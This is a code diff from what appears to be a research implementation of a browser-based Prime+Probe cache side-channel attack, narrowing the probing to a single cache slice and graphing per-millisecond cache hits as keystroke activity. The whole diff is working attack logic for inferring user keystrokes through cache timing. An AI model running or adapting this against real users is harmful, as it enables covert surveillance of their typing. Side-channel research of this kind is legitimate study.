@@ -661,35 +661,28 @@ async function l3pp_main(options){
     let start_measurement = Math.floor(performance.now());
     log("start: "+start_measurement)
 
-    const KEYSTROKE_BUFFER_SIZE = 256 * 1024;
-    const NUM_MEASUREMENTS_MS = 2048 / NUM_SLICES;
+    const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
+    const NUM_MEASUREMENTS_MS = 1024;
+    const TARGET_SLICE = 3
 
-    let hit_count_per_ms = [] 
+    let hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS) 
 
-    // initialize the traces array
-    let traces = []
-    for(let i = 0; i < NUM_SLICES; i++){
-        traces.push(new Uint8Array(KEYSTROKE_BUFFER_SIZE));
-        traces[i].fill(0)
-        hit_count_per_ms.push(new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS));
-        hit_count_per_ms[i].fill(0);
-    }
+    let traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE)
+
+    hit_count_per_ms.fill(0);
+    traces.fill(0);
 
     let num_traces = 0;
     
     /* warm up all sets for the test */
     for(let i = 0; i < 10; i++){
-        for(let j = 0; j < NUM_SLICES; j++){
-            found_sets[j].probe()
-        }
+        found_sets[TARGET_SLICE].probe()
     } 
 
     while(num_traces < KEYSTROKE_BUFFER_SIZE){
         for(let i = 0; i < 8; i++){
-            for(let j = 0; j < NUM_SLICES; j++){
-                let result = found_sets[j].probe();
-                traces[j][num_traces] += (result << i); 
-            }
+            let result = found_sets[TARGET_SLICE].probe();
+            traces[num_traces] += (result << i); 
         }
         num_traces++;
     }
@@ -701,18 +694,16 @@ async function l3pp_main(options){
 
     for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
         for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
-            for(let k = 0; k < NUM_SLICES; k++){
-                let data = traces[k][i * NUM_MEASUREMENTS_MS / 8 + j];
-                for(let l = 0; l < 8; l++){
-                    let result = data & 1;
-                    hit_count_per_ms[k][i] += result;
-                    data >>= 1;
-                }
+            let data = traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            for(let l = 0; l < 8; l++){
+                let result = data & 1;
+                hit_count_per_ms[i] += result;
+                data >>= 1;
             }
         }
     }
 
-    await graphKeystrokes({"data": hit_count_per_ms, "pp_duration": hit_count_per_ms[0].length, "js_duration": duration, "start_time": start_measurement});
+    await graphKeystrokes({"data": hit_count_per_ms, "pp_duration": hit_count_per_ms.length, "js_duration": duration, "start_time": start_measurement});
 
     // remote_set_profiling(evset);
     await stopTimer();
